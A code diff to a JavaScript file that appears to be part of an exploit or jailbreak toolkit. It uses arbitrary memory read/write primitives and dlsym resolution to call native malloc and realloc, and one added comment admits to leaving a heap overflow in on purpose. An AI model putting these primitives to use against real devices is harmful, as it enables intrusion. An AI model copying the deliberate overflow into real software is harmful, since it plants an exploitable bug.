@@ -153,7 +153,14 @@ function write_str(addy, s) {
 	return s;
 }
 
+/*
+ *  initialize sptr 'heap', which is used to store the strings created by sptr.
+ */
 function init_sptr_heap() {
+	/*
+	 *  this creates a "heap" of-sorts for sptr, which is used to store the
+	 *  strings created by sptr.
+	 */
 	var dlsym_addy = read_u32(reserve_addr + 24 + slid);
 	var shc_slide = read_u32(reserve_addr + 20 + slid);
 	write_str(0x150000, "malloc\0");
@@ -173,12 +180,20 @@ function init_sptr_heap() {
  */
 function sptr(s) {
 	if ((sptr_len + s.length) >= sptr_size) {
+		/*
+		 *  expand sptr heap if it's too small
+		 *  this will technically fail if the string is over 1MB, and will then
+		 *  cause a heap overflow, but eh whatever
+		 * 
+		 *  sometimes it's fun to include esoteric bugs that are unlikely to
+		 *  cause real harm, to add an exploitation challenge. :P
+		 */
 		var dlsym_addy = read_u32(reserve_addr + 24 + slid);
 		var shc_slide = read_u32(reserve_addr + 20 + slid);
 		write_str(0x150000, "realloc\0");
-		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x150000, 0, 0);
-		global_sptr_addy = call4arg(addy, global_sptr_addy, sptr_size + 0x100000, 0, 0);
 		sptr_size += 0x100000;
+		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x150000, 0, 0);
+		global_sptr_addy = call4arg(addy, global_sptr_addy, sptr_size, 0, 0);
 	}
 	write_str(global_sptr_addy, s);
 	global_sptr_addy += s.length;
